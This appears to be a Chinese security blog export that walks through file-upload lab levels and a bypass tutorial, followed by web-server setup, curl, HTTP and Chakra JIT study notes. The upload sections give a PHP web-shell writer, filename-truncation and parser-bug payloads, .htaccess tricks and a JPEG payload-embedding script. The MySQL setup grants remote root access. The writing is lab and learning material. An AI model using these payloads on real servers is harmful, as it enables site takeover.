$startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-&gt;eof())) { if($dis-&gt;readByte() === 0xFF) { if($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) { die(&#39;Success!&#39;); } else { break; } } } } unlink(&#39;payload_&#39;.$argv[1]); die(&#39;Something\&#39;s wrong&#39;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = &#39;&#39;; $this-&gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(&#39;File not exists [&#39;.$filename.&#39;]&#39;); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if($this-&gt;eof()) { die(&#39;End Of File&#39;); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-&gt;binData) &lt; 2) { die(&#39;End Of File&#39;); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); } } ?&gt; Pass-17这一关提示我们源码审计，看了下他的源码发现存在条件竞争漏洞，它会先将上传的文件保存，然后再检查文件类型是否为jpg|png|gif中的一个，如果不是就会用unlink将文件删除。 $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = &#39;上传出错！&#39;; } } 这里我通过bp的intruder模块来重复发包，先抓了一个访问shell.php的bao，然后设置好Payload type为Null Payloads，线程数为50 然后shell.php那个包我是用hackhttp这个库发送的 在跑脚本的同时运行intruder模块，返回状态码为200则说明成功访问到shell.php 本来我是想直接写另一个马到服务器的…但是我的win10虚拟不知道为什么报错，php代码如下： &lt;?php fputs(fopen(&quot;../poc.php&quot;,&quot;w&quot;),&#39;&lt;?php @eval($_POST[cmd]);&#39;); ?&gt; 这个打开文件流时会报错，路径问题…看的很迷，linux的环境我没搭，下次试试再试试这个。 Pass-18嗯嗯嗯，不会，看网上大佬的writeup说是条件竞争绕过文件重命名然后配合apache解析漏洞 Pass-19%00截断，保存的文件名可控 shell.php%00.jpg Pass-20代码审计 $is_upload = false; $msg = null; if(!empty($_FILES[&#39;upload_file&#39;])){ //检查MIME $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;); if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type)){ $msg = &quot;禁止上传该类型文件!&quot;; }else{ //检查文件名 $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;]; if (!is_array($file)) { $file = explode(&#39;.&#39;, strtolower($file)); } $ext = end($file); $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); if (!in_array($ext, $allow_suffix)) { $msg = &quot;禁止上传该后缀文件!&quot;; }else{ $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1]; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;文件上传成功！&quot;; $is_upload = true; } else { $msg = &quot;文件上传失败！&quot;; } } } }else{ $msg = &quot;请选择要上传的文件！&quot;; } 它先检查MIME类型是否为jpeg|png|gif中的一种，然后判断save_name是否为数组，如果不是就用explode函数将它切分为数组。接着判断文件扩展名的时用到end(save_name)，也就是数组的最后一个，但是保存文件名时 后缀名用的是$file[count($file) - 1]。这里绕过只要使end(save_name) != $file([count($file) - 1]) 就可以了，然后还有一个绕过点是move_uploaded_file函数会忽略文件名末尾的/. save_name[0] = shell.php/ save_name[2] = jpg]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2020%2F04%2F25%2F2020-4-25-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[文件上传漏洞漏洞原理网站WEB应用存在一些文件上传功能，如文档、头像、图片、视频上传等，但是上传文件时，服务端代码对客户端上传的文件没有进行严格的校验和过滤，就可能导致可以上传任意文件。 危害通过这个漏洞，非法用户可以上传恶意脚本文件（webshell），通过webshell来控制整个网站，可以实现查看服务器目录、文件、执行系统命令等操作。 上传检测流程 客户端 JavaScript检测文件扩展名 服务端 服务端MIME类型检测（检测Content-Type内容） 服务端目录路径检测（检测Path参数相关的内容） 服务端文件扩展名检测 服务端文件内容检测（检测文件头或者是否包含恶意代码） 绕过方法 JS检测绕过 客户端浏览器使用JS对客户上传的文件后缀名进行检测，如果不符和条件就会弹框警告。 function checkUpload(fileobj){ var fileArr = fileobj.value.split(&quot;.&quot;); //对文件名进行处理 var ext = fileArr[fileArr.length-1]; //得到文件扩展名 if(ext!=&#39;gif&#39;) //验证扩展名 { alert(&quot;Only upload GIF images.&quot;); fileobj.value = &quot;&quot;; //清除数据 } } 这个很容易绕过，大致有两种方法。 一是直接禁用掉浏览器的JS，这个方法比较粗暴，不推荐使用，禁用JS的话可以用火狐的一个叫NoScript的插件。 另一种方法是将要上传的文件后缀改为允许上传的后缀，绕过JS检测，再抓包，将后缀名修改为可执行脚本的后缀名。 文件类型绕过 如果服务端是通过Content-Type来判断文件类型的话，只要抓包修改它的值为允许的值就可以绕过了 服务端文件扩展名绕过 服务端文件扩展名检测有两种检测方法： 黑名单检测 黑名单检测会检测上传的文件是否是包含在blacklist里的危险类型，如： $file_name = $_FILES[&#39;fupload&#39;][&#39;name&#39;]; // 文件名 $file_ext = substr($file_name, strrpos($file_name,&#39;.&#39;) + 1); //文件后缀 $file_tmp = $_FILES[&#39;fupload&#39;][&#39;tmp_name&#39;]; //临时文件 $target_path = &quot;uploads/&quot;.md5(uniqid(rand())).&quot;.&quot;.$file_ext; //存储路径与名称 // 检测后缀名 $black_ext = explode(&quot;|&quot;, &quot;asp|asa|cer|cdx|aspx|ashx|ascx|asax|php|php2|php3|php4|php5|asis|htaccess|htm|html|shtml|pwml|phtml|phtm|js|jsp|vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini&quot;); // 转换为数组 if(in_array($file_ext,$black_ext)) { exit(&quot;Only upload GIF images.&quot;); } 白名单检测 白名单检测会只允许用户上传指定类型的文件，如：jpg/png/gif等 黑名单检测绕过 后缀名大小写绕过 服务端没有将后缀名转化成统一的格式进行比较，导致可以上传成功后缀为PhP等类型的文件，同时windows操作系统对大小写不敏感，所以.PhP会被当做.php文件解析。这个在Linux下就不好使了。 重写绕过 服务端将黑名单的后缀名都替换为空，但是它只进行一次。那么上传后缀名为.pphphp的文件，替换php一次为空，文件的后缀名就为.php 特殊可解析绕过 服务端的黑名单不严谨，在某些特定的环境某些特殊的后缀名也会被当成php文件解析。 php|php2|php3|php4|php5|php6|php7|phtml|phtm|pht 基于debain和ubuntu的apt-get安装的apache2，默认对文件解析规则如下： .htaccess绕过 在apache中，.htaccess是一个配置文件，可以用来控制文件目录的访问权限以及解析设置。可以通过这个文件将该目录下的所有文件当作php来解析。 配置上要允许.htaccess生效 Apache开启rewrite模块 Apache配置文件为AllowOverride All(默认为None) 配置文件的两种写法 AddType application/x-httpd-php .jpg or &lt;FileMatch &quot;jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FileMatch&gt; 通过上传这样一个.htaccess文件，就可以将目录下的jpg当作php来解析了。 利用操作系统特性-windows windows对文件和文件名存在限制，上传不符合windows文件命名规则的文件名，在最后生成文件时，字符会被自动去除 shell.php. shell.php...... shell.php_ shell.php(空格) shell.php[%81-%99] windows文件流绕过 shell.php::$DATA shell.php::$DATA...... 白名单检测绕过 白名单检测一般比较难绕过，通常是比较难绕过的，一般是结合解析漏洞、服务端代码漏洞（造成%00截断的相关函数）、以及相关的操作系统特性来绕过。 %00截断 这个对php的版本有要求， php 版本&lt;5.3.4 ，同时php的magic_quotes_gpc为OFF状态 。 在文件上传中，利用%00截断，在文件扩展名验证时，是去文件的扩展名来验证，但是最后文件保存到本地时，%00会截断文件名，只保存%00之前的内容。 具体做法，上传一个shell.php的文件，抓包将文件名修改为shell.php%00.jpg，上传成功。 操作系统特性 文件名使用非字母数字，比如中文等最大程度的拉长，不同的操作系统文件名最大长度不同，可以测试出来。 windows windows10文件名长度最大为223包括后缀，win2012的为237 Linux linux ubuntu.16.04.1文件名长度最大252 服务端文件内容检测绕过 文件头检测 服务端只检测了文件头，png|jpg|gif文件头如下： PNG：8950 4E 47 JPG：FFD8 FF E0 00 10 4A 46 49 46 GIF：4749 46 38 39 61 只要在一句话木马前加上文件头就可以绕过了 getimagesize()函数绕过 服务端使用getimagesize()函数来检测文件类型，这个函数通过检查文件头来判断文件类型，所以绕过方法和上面一样，也是加对应的文件头就可以了 exif_imagetype() exif_imagetype()函数通过读取文件的第一个字节来判断文件类型，绕过方法同上 图片二次渲染 服务端对图片进行了二次渲染，将原本属于图片数据的部分提取出来，再用自己的API或者函数进行渲染，通常php使用的是GD库，这个一般比较难绕过。 基本绕过方法是基本方法是通过对比处理前和处理后的图片数据，找出没未经处理的数据区域，然后将代码插入。 GIF可以使用基本方法去做，但是jpg和png就比较难。 jpg和png的制作方法参考: https://xz.aliyun.com/t/2657 条件竞争绕过 一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传文件是否包含webshell，如果包含则删除该文件。这里存在条件竞争，文件上传成功后和删除文件之间存在时间差，利用这个时间差可以生成一个新的webshell &lt;?php fputs(fopen(&quot;../shell.php&quot;,&quot;w&quot;),&#39;&lt;?php @eval($_POST[cmd]);&#39;); ?&gt; 解析漏洞解析漏洞是指服务器对http请求处理不当导致将非可执行的文件当作可执行的脚本来执行，一般配合文件上传功能使用。 IIS IIS6.0 目录解析 在网站下建立的文件夹的名称中带有.asp、.asa等可执行脚本文件后缀的文件夹，其目录下的任何扩展名文件都会被IIS当作可执行脚本来解析并执行。 www.demo.com/shell.asp/shell.jpg 文件解析 服务器默认不解析;后的内容，所以shell.asp;.jpg会被识别为asp文件 shell.asp;.jpg 文件类型解析 IIS6.0默认可执行文件除了.asp，还包括 .asa .cdx .cer ，这三种类型都可以被解析执行。 IIS7.0/IIS7.5 漏洞出现自php-cgi，与Nginx的解析漏洞类似。对任意文件名只要在URL后面追加字符串/任意文件名.php就会被当成php文件去解析。 shell.jpg/x.php ApacheApache解析文件的规则是从右到左的开始判断的，如果后缀名为不可识别文件，就往左判断. shell.php.xxx.aaa.bbb 这个文件会被解析成php 漏洞存在的Apache版本 Apache2.0.x&lt;=2.0.59Apache2.2.x&lt;=2.2.17 NginxNginx默认是以CGI的方式支持php解析的，通常的做法是在Nginx的配置文件中通过正则设置 SCRIPT_FILENAME 。当访问www.demo.com/shell.jpg/x.php时，$fastcgi_scipt_name会被设置为”shell.jpg/x.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI。如果开启了fix_pathinfo这个选项，那么PHP会认为SCRIPT_FILENAME是shell.jpg，而x.php 是PATH_INFO，所以shell.jpg会被当成php来解析。 REFERENCE https://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/ https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/ https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/ https://www.freebuf.com/articles/web/179954.html http://byd.dropsec.xyz/2017/02/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87/]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu18.04搭建web环境]]></title>
    <url>%2F2020%2F03%2F13%2F2020-3-13-Ubuntu18.04%E6%90%AD%E5%BB%BAweb%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[Ubuntu18.04搭建web环境如题所示，我准备在Ubuntu18.04搭建一个web环境，要安装的东西有Apache、Mysql、PHP，本来是想在直接我的服务器上捣鼓的，但是第一次搞，怕把我白嫖来的服务器搞坏，所以先拿虚拟机练练手，写篇文章记录下。 apache2安装 sudo apt install apache2 -y 安装完后可以通过访问自身ip查看apache的默认page页面，上面有一些关于apache2配置的说明，简单阅读下。 apahce2的配置布局如下 /etc/apache2/ |-- apache2.conf | `-- ports.conf |-- mods-enabled | |-- *.load | `-- *.conf |-- conf-enabled | `-- *.conf |-- sites-enabled | `-- *.conf apache2.conf 是主要的配置文件，在服务器启动时，它通过包含其他所有剩余的配置文件来整理各个部分。 ports.conf 始终包含在主配置文件中，它用于确认传入连接的监听端口，我们随时可以自定义这个文件 在 mods-enbaled , conf-enabled和 sites-enabled 目录下，存在着分别管理模块，全局配置片段/虚拟主机配置的特定配置片段的配置文件 因为需要使用到环境变量，所以apache2要通过 /etc/init.d/apache2或者apache2ctl来启动，使用/usr/bin/apache2的话 将无法使用默认配置 网页的根目录默认是/var/www/html，如果需要修改的话可以通过/etc/apache2/apache2.conf 来修改 配置 配置apache允许的用户 创建组：groupadd apache 创建用户:useradd -r -g apache apache 在apache的配置文件apache2.conf中设置User和Group 修改网站根目录的所有者以及网站文件权限 root@ubuntu:/var/www# chown -R apache:apache . root@ubuntu:/var/www/html# chmod 744 -R . 重启apache sudo systemctl restart apache2 查看apache2配置 sudo apachectl -S 这条命令会打印出apache的配置的具体信息，其中主要的是VirtualHost configuration，它给出了apache当前使用的配置文件，要注意的是 这里显示的配置文件路径/etc/apache2/sites-enabled/000-default.conf这个只是一个软连接，真正的配置文件在/etc/apache2/sites-available/下。 修改完配置文件可以通过sudo apache2ctl configtest命令来检查配置文件语法是否正确。 然后执行下面两条命令使配置生效 sudo a2ensite ××××.conf sudo systemctl restart apache2 mysqlmysql大家应该都很熟悉了，一款数据库管理软件 安装方法sudo apt install mysql-server -y 基本配置初始化配置 zs0zrc@ubuntu:/var/www/html$ sudo mysql_secure_installation Securing the MySQL server deployment. Connecting to MySQL using a blank password. VALIDATE PASSWORD PLUGIN can be used to test passwords and improve security. It checks the strength of password and allows the users to set only those passwords which are secure enough. Would you like to setup VALIDATE PASSWORD plugin? Press y|Y for Yes, any other key for No: Y There are three levels of password validation policy: LOW Length &gt;= 8 MEDIUM Length &gt;= 8, numeric, mixed case, and special characters STRONG Length &gt;= 8, numeric, mixed case, special characters and dictionary file Please enter 0 = LOW, 1 = MEDIUM and 2 = STRONG: 0 Please set the password for root here. New password: Re-enter new password: Estimated strength of the password: 50 Do you wish to continue with the password provided?(Press y|Y for Yes, any other key for No) : y By default, a MySQL installation has an anonymous user, allowing anyone to log into MySQL without having to have a user account created for them. This is intended only for testing, and to make the installation go a bit smoother. You should remove them before moving into a production environment. Remove anonymous users? (Press y|Y for Yes, any other key for No) : y Success. Normally, root should only be allowed to connect from &#39;localhost&#39;. This ensures that someone cannot guess at the root password from the network. Disallow root login remotely? (Press y|Y for Yes, any other key for No) : N ... skipping. By default, MySQL comes with a database named &#39;test&#39; that anyone can access. This is also intended only for testing, and should be removed before moving into a production environment. Remove test database and access to it? (Press y|Y for Yes, any other key for No) : y - Dropping test database... Success. - Removing privileges on test database... Success. Reloading the privilege tables will ensure that all changes made so far will take effect immediately. Reload privilege tables now? (Press y|Y for Yes, any other key for No) : y Success. All done! 测试mysql服务是否正常 远程连接配置 因为Ubuntu下的mysql-server默认是只运行本机连接访问的，如果想远程连接的话，就要配置一下 登录mysql 添加一个新的root用户，允许所有ip访问 mysql&gt;GRANT ALL PRIVILEGES ON *.* TO root@&quot;%&quot; IDENTIFIED BY &#39;zs0zrc123456&#39;; mysql&gt;flush privileges; 修改mysql配置文件 sudo vim etc/mysql/mysql.conf.d/mysqld.cnf 将bind-address = 127.0.0.1 修改为 bind-address = 0.0.0.0 重启mysql sudo /etc/init.d/mysql restart php安装sudo apt install php libapache2-mod-php php-mysql -y 基本配置打开apache的配置文件 sudo vim /etc/apache2/mods-available/dir.conf &lt;IfModule mod_dir.c&gt; DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm &lt;/IfModule&gt; 将index.php的位置移到 index.html前面，这个配置文件设置的是apache寻找文件的优先级。 重启apache sudo systemctl restart apache2 写个index.php测试一下是否修改成功 &lt; ? echo &quot;hello world~&quot;;?&gt; 然后访问就可以看apache选择了index.php文件了 这样，一个基本的web环境就搭建成功了。 通过docker搭建web环境更新一下怎么通过docker搭建基本web环境 环境还是ubuntu18.04 首先给docker加加速 往 /etc/docker/daemon.json 写入下面的内容： {“registry-mirrors”:[“https://registry.docker-cn.com&quot;]} 然后重启服务 $ sudo systemctl daemon-reload$ sudo systemctl restart docker 阿西吧，f**k，一直出奇奇怪怪的问题。折腾了一天，发现了个更简单的办法……直接拖对应的镜像下来就好了 命令： docker container run -p 80:80 -d \ --rm \ --name lamp \ --volume &quot;$PWD/&quot;:/var/www/html \ php:5.6-apache 参数作用： -p 80:80 将容器80端口映射到主机的80端口上 --rm ： 容器停止后自动删除 --name：指定容器名字 -d ：容器以后台形式运行 --volum &quot;$PWD/&quot;:/var/www/html : 将当前目录$PWD映射到容器中的/var/www/html REFERENCE https://luomuxiaoxiao.com/?p=707 https://blog.csdn.net/hanshileiai/article/details/46967081 https://www.howtoing.com/how-to-install-the-apache-web-server-on-ubuntu-18-04-quickstart https://www.ruanyifeng.com/blog/2018/02/docker-wordpress-tutorial.html]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[curl命令行工具的用法]]></title>
    <url>%2F2020%2F03%2F13%2F2020-3-13-curl%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[curl命令行工具的用法curl简介curl是一个开源的用于数据传输的命令行工具与库，主要用来发出网络请求，然和得到和提取数据，最后显示在“标准输出”上。它使用URL语法格式，支持很多种协议，如 DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS 等等。curl库提供了很多功能，可以用来进行HTTP/HTTPS请求，上传/下载文件等，并且它还支持Cookie、认证、代理、限速等。 curl的使用访问URLcurl命令后面直接加上要访问的网址，就可以看到网页的源码 ，它不加任何参数时发出的请求是GET请求。 如果想将这个网页保存下来，可以使用’-o’参数，指定保存的文件名 重定向跟踪 如果页面使用了重定向，可以使用‘-L’参数来跟踪URL重定向，curl就会跳转到新网址 查看头信息 如果需要查看访问的页面可以使用 参数 ‘-i’， 如果只需要查看头信息可以用参数’-I’ 显示通信过程 ‘-v’参数可以显示一次http通信的完整过程，包括端口连接，以及http request头信息 如果需要更加详细的信息，可以使用’–trace’ 或者’–trace-ascii’参数，这两个参数后面加要保存的文件名 指定请求方式curl通过’-X’参数来指定请求方式，默认不加这个参数时使用GET请求 GET请求 不加参数或者使用’-X GET’指定 curl -X GET URL 假设表单源码为 &lt;form name=&quot;input&quot; action=&quot;demo.php&quot; method=&quot;GET&quot; &gt; &lt;input type=&quot;text&quot; name=&quot;nickname&quot;&gt; &lt;input type=&quot;password&quot; name=&quot;passwd&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; 直接将参数附在网址后面就可以了 curl http://192.168.45.129/demo1.html?nickname=zs0zrc&amp;&amp;passwd=123 POST请求 curl使用POST提交表单数据时，除了使用’-X’指定请求方法，还要用’-d’ 指定请求数据。如果数据没有经过URL编码，可以用’–data-urlencode’来对数据进行编码 假设表单源码为 &lt;form name=&quot;input&quot; action=&quot;demo.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;nickname&quot;&gt; &lt;input type=&quot;password&quot; name=&quot;passwd&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; 命令： curl -X POST -d &quot;nickname=zs0zrc&amp;passwd=123&quot; http://192.168.45.129/demo1.html curl -X POST --data-urlnecode &quot;nickname=zs 0zrc&amp;passwd=123&quot; http://192.168.45.129/demo1.html 因为使用了’-d’参数后，HTTP请求会自动添加Content-Type: application/x-www-form-urlencoded 并且会自动将请求方法转换为POST，所以可以直接这样用 curl -d &quot;nickname=zs0zrc&amp;passwd=123&quot; http://192.168.45.129/demo1.html -d参数可以直接读取本地文件的内容，作为数据体向服务器传送 curl -d &quot;@data.txt&quot; http://192.168.45.129/demo1.html 如果要以json的格式上传参数，要使用’-H’指定header curl -H &quot;Content-Type:application/json&quot; -X POST -d &#39;{&quot;username&quot;:&quot;zs0zrc&quot;,&quot;passwd&quot;:&quot;123&quot;}&#39; [URL] 指定cookie 使用’–cookie’参数可以让curl发送cookie curl --cookie &quot;usrname=zs0zrc&quot; www.example.com curl可以通过’-c’参数保存服务器返回的cookie值到文件，然后通过’-b’参数指定目标文件作为cookie信息 curl -c cookies http://example.com curl -b cookies http://example.co 增加header信息 使用’–header’参数，后面加需要添加的头信息 curl --header &quot;Content-Type:application/json&quot; http://example.com HTTP基本认证 使用’–user’参数，指定name和password curl --user name:password http://example.com REFERENCE http://www.ruanyifeng.com/blog/2011/09/curl.html https://www.ruanyifeng.com/blog/2019/09/curl-reference.html https://itbilu.com/linux/man/4yZ9qH_7X.html]]></content>
      <categories>
        <category>tool</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[HTTP学习笔记]]></title>
    <url>%2F2020%2F03%2F11%2F2020-3-11-HTTP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[最近开始学习了，为了找回学习状态，复习下计网，准备将几个常用的重要的协议都复习一遍。 HTTP学习笔记HTTP简介HTTP是 Hypertext Transfer Protocol 的缩写，也就是超文本传输协议，根据RFC定义，HTTP是分布式协作超媒体信息系统的应用级协议。简单的说就是位于应用层的协议，用于从www服务器传输超文本到本地浏览器。它是一种通用的，无状态的协议。 HTTP的特点 HTTP是无连接的 它每次连接只能处理一个请求，服务端处理完客户端的请求，并受到客户端的回应后，就会断开连接 HTTP是媒体独立的 只要服务器和客户端知道如何处理数据内容，任何类型的数据都可以通过HTTP发送，客户端和服务器需要指定MIME-type，也就是数据内容类型。 HTTP是无状态的 HTTP协议是无状态协议，无状态指的是它对事务处理没有记忆能力。假设如果后续需要用到前面的信息，那么它就需要重传，这会导致每次连接传送的数据量增大。但是从另一方面来说，如果不需要先前信息，那么它的应答又会比较快 HTTP消息结构客户端请求消息 基本格式： 请求行（request line）、请求头部（header）、空行和请求数据 请求行：说明请求类型，要访问的资源以及所使用的HTTP版本 请求头部：用来说明服务器要使用的附加信息 空行：这个是必须的，即使请求数据为空，也必须有空行 请求数据：就是数据啊 请求方法： HTTP中一共定义了8种请求方法 OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。 HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。 GET：向特定的资源发出请求。 POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。 POST请求可能会导致新的资源的创建和/或已有资源的修改。 PUT：向指定资源位置上传其最新内容。 DELETE：请求服务器删除Request-URI所标识的资源。 TRACE：回显服务器收到的请求，主要用于测试或诊断。 CONNECT： HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。 服务器响应消息 基本格式： 状态行、消息报头、空行和响应正文。 状态行：由HTTP协议版本号，状态码以及状态消息三部分构成 消息报头：用来说明客户端要用的一些附加消息 空行：位于消息报头之后，必须的 响应正文：服务器返回给客户端的信息 响应头和请求头 响应头 根据MDN web文档上的定义，响应头被用于http响应中并且和响应消息主体无关的那一类 HTTP header。像Age, Location 和 Server都属于响应头，他们被用于描述响应 请求头 请求头是 HTTP 头的一种，它可在 HTTP 请求中使用，并且和请求主体无关 。某些请求头如 Accept、Accept-*、 If-* 允许执行条件请求。某些请求头如：Cookie, User-Agent 和 Referer 描述了请求本身以确保服务端能返回正确的响应。 header 用于传递一些附加信息，基本格式： 键： 值， 冒号后面要加一个空格 常见的header 响应和请求常见通用header 常见请求header 常见响应header header的含义可以查腾讯云社区的开发者手册 HTTP状态码定义： HTTP状态码是用以表示网页服务器超文本传输协议响应状态的3位数字代码 HTTP状态码分类 1xx:信息响应类，表示接收到请求并且继续处理 2xx:处理成功响应类，表示动作被成功接收、理解和接受 3xx:重定向响应类，为了完成指定的动作，必须接受进一步处理 4xx:客户端错误，客户请求包含语法错误或者是不能正确执行 5xx:服务端错误，服务器不能正确执行一个正确的请求 状态码具体含义也可以看维基百科定义 ) 常见的HTTP状态码 2xx 200 OK- 请求成功，如果是非head请求，服务器返回的响应头都会包括body数据 204 No Content : 常见的成功状态码，与200 OK基本相同，但是没有body数据 206 Partial Content ：应用于HTTP分块下载或者断电续传，表示响应返回的body数据并不是资源的全部，而是其中的一部分。 3xx 301 Moved Permanently ： 资源（网页等）被永久转移到其它URL，说明请求的资源不存在了。 302 Found ：表示临时重定向，说明请求的资源还在，但是暂时需要另一个URL来访问 301和302都会在响应头使用字段Location，指明后续要跳转的URL 304 Not Modified ：不具备跳转含义，表示资源未修改，重定向已存在的缓存文件，也成为缓存重定向，用于缓存控制。 4xx 400 Bad Request ：表示客户端请求的报文有错误 401 Unauthorized：服务端要求身份验证 403 Forbidden ：表示服务器禁止访问资源，并不是客户端的请求错误 404 Not Found ：请求的资源（网页等）不存在 405 Method Not Allow：请求方法不支持 5xx 500 Internal Server Error ：表示服务器发生了错误，具体是什么的错误就不知道了 501 Not Implemented ：表示 客户端请求的功能还不支持 502 Bad Gateway ：通常是服务器作为网关或者代理时返回的错误码，表示服务器自身工作正常，访问后端服务器发生了错误 503 Service Unavailable ：表示服务器当前很忙，暂时无法响应服务 总结HTTP协议基础的东西大致就这么多了，但是HTTP协议还有好多内容，比如Access control CORS 、Authentication访问和认证机制、Caching缓存机制等等，那些内容感觉每个点都可以单独写一篇文章，等以后慢慢看，看腾讯云社区的开发者手册来学习，也会去读一读HTTP协议的RFC文档。 Reference: https://www.jianshu.com/p/e544b7a76dac https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81 https://www.runoob.com/http/http-methods.html https://segmentfault.com/a/1190000006689786 https://www.jianshu.com/p/80e25cb1d81a]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-8372]]></title>
    <url>%2F2019%2F06%2F01%2F2019-6-1-CVE-2018-8372%2F</url>
    <content type="text"><![CDATA[跟着大佬博客学习Chakra JIT优化eliminate duplicate checktest1.js var arr = [1.1,2.2]; function jit() { arr[1] = 2.2; arr[2] = 1.1; } run： .\ch.exe .\test1.js -bgjit- -mic -dump:Globopt -OutputFile:output.txt 在第一次对arr数组操作时，会检查arr的类型，而在第二次对arr数组操作时，就不需要BailOnNotArray的检查了，这是JS引擎对冗余检查的优化，但是当其中可能存在带回调的操作时就不能消除这个检查。 例如: arr[1] = 1.1 object.property;回调 arr[2] = 2.2 这里涉及到了Chakra的kill 机制，这个机制主要用于去除保存的type类型。其中对JSArray处理的代码是GlobOpt::CheckJsArrayKills这个函数，位于/lib/Backend/GlobOpt.cpp中。 其中有两处关键的判断，一处是doArrayMissingValueCheckHoist， 另一处是检查数组类型和element的类型是否一致，如果一致的话就不去除type信息，如果不一致的话就将type信息去除。 引用大宝的分析： 代码注释已经说得很清楚,假如array的type与element type一致,就不要把type信息去掉,这是一个比较激进的优化,而InlineArrayPush 